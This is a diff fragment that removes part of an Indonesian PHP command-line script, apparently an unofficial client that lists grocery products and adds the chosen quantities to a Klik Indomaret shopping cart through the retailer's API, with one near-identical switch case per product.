-					echo @color('yellow', "[24] Frisian Flag,Susu Kental Manis Cokelat 560G Pch\n");
-					echo @color('yellow', "[25] Frisian Flag,Susu Kental Manis Putih 560G Pch\n");
-					echo @color('yellow', "[26] Indomie,Mie Goreng Plus Special 80G Pck\n");
-					echo @color('yellow', "[27] Lifebuoy,Sabun Mandi Cair Refill Blue 450Ml Pch\n");
-					echo @color('yellow', "[28] Lifebuoy,Sabun Mandi Cair Refill Lemon Fresh 450Ml Pch\n");
-					echo @color('yellow', "[29] Lifebuoy,Sabun Mandi Cair Refill Red 450Ml Pch\n");
-					echo @color('yellow', "[30] Lifebuoy,Sabun Mandi Cair Refill White 450Ml Pch\n");
-					echo @color('yellow', "[31] Mamy Poko,Pants Standar 26'S  Extralarge Pck\n");
-					echo @color('yellow', "[32] Mamy Poko,Pants Standar 30'S  Large Pck\n");
-					echo @color('yellow', "[33] Mamy Poko,Pants Standar 34'S  Medium Pck\n");
-					echo @color('yellow', "[34] Mamy Poko,Pants Standar 40'S  Small Pck\n");
-					echo @color('yellow', "[35] Pepsodent,Pasta Gigi White  225G Tub\n");
-					echo @color('yellow', "[36] Bango Kecap Manis Light 550Ml\n");
-					echo @color('yellow', "[37] Bango Kecap Manis 550Ml\n");
-					echo @color('yellow', "[38] Indomilk Kental Manis Coklat 6X37g\n");
-					echo @color('yellow', "[39] Indomilk Kental Manis Putih 6X37g\n");
-					echo @color('yellow', "pilih : ");
-					$pilih = trim(fgets(STDIN));
-					switch ($pilih) {
-						case '1':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=0c0bd147-7c6a-4498-a610-87fa7083b67b&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '2':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=05b63677-d010-4910-bf16-93c0039c999b&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '3':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=a1b98100-1c8c-452a-95a2-bdb27c5ae56a&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '4':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=e27efba9-ffdb-40b8-9b6a-5e9272ab5a91&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '5':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=e34d2d1f-dfd1-4582-b10b-23f5153dbe05&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '6':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=0828b072-483e-4ee0-9f99-7c33f33fc6eb&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '7':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=61433352-baa9-4dc4-bcec-fda1d8685a96&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '8':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=2f29a0db-6dee-42b7-bf82-fe0223fa187a&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '9':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=fc4b5152-70a1-4344-9fb8-fffb43276a20&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '10':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=937933c9-8e69-4b9f-8c23-a8af0562526a&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '11':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=d42fe133-ab06-4ff2-89ee-7c73ceeb836c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '12':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=10fb920f-c66f-4d12-a341-4945c6b7cf2f&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '13':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=d04cb3aa-250d-4847-aa4a-b5e6617617d5&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '14':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=a03e5da1-8ade-457b-b811-e176626d7277&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '15':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=0f4d121c-59d9-452a-addb-041774766673&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '16':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=d4786ab0-8db1-463f-9632-3df3bc6c2990&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '17':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=a899ff19-35ae-43e7-abef-88b76ba92155&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '18':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=ec3966af-762d-43c0-a06e-b4b66165fce4&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '19':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=c4fc8526-b00e-4070-93a0-cba965d45e49&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '20':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=b7a881cc-371d-4334-9ed5-fc778bb6d7ea&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '21':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=99f928b9-1ea3-4636-ae68-b551621aff8c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '22':
